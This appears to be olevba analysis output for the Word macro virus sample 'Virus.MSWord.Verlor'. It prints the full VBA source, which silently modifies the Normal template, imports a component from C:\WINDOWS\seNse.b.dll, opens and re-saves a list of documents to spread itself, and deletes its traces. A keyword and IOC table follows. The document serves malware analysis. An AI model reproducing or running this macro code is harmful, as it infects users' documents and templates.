olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Verlor-2cc09d815ab36484fa286d9e5778a22d54795948
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Verlor-2cc09d815ab36484fa286d9e5778a22d54795948 
in file: Virus.MSWord.Verlor-2cc09d815ab36484fa286d9e5778a22d54795948 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On error resume next

Set WordObj = CreateObject("Word.Application")
WordObj.Options.SaveNormalPrompt = False
WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents("module1")
WordObj.NormalTemplate.save
WordObj.NormalTemplate.VBProject.VBComponents.import ("C:\WINDOWS\seNse.b.dll")
WordObj.NormalTemplate.save

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
set a =  FSO.OpenTextFile("c:\himem.sys", 1, True)
contents = a.readall()
a.close
set b =  FSO.OpenTextFile("c:\himem.dll", 2, True)
b.write(contents)
b.close
set a =  FSO.OpenTextFile("c:\himem.dll", 1, True)
Do While a.atendofstream <> True
documentname = a.readline
If documentname <> "" then
WordObj.Documents.open (documentname)
WordObj.activedocument.save
WordObj.activedocument.close
End if
Loop
a.close
set NT = ""
WordObj.Quit
fso.deletefile"c:\himem.sys"
fso.deletefile"c:\himem.dll"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

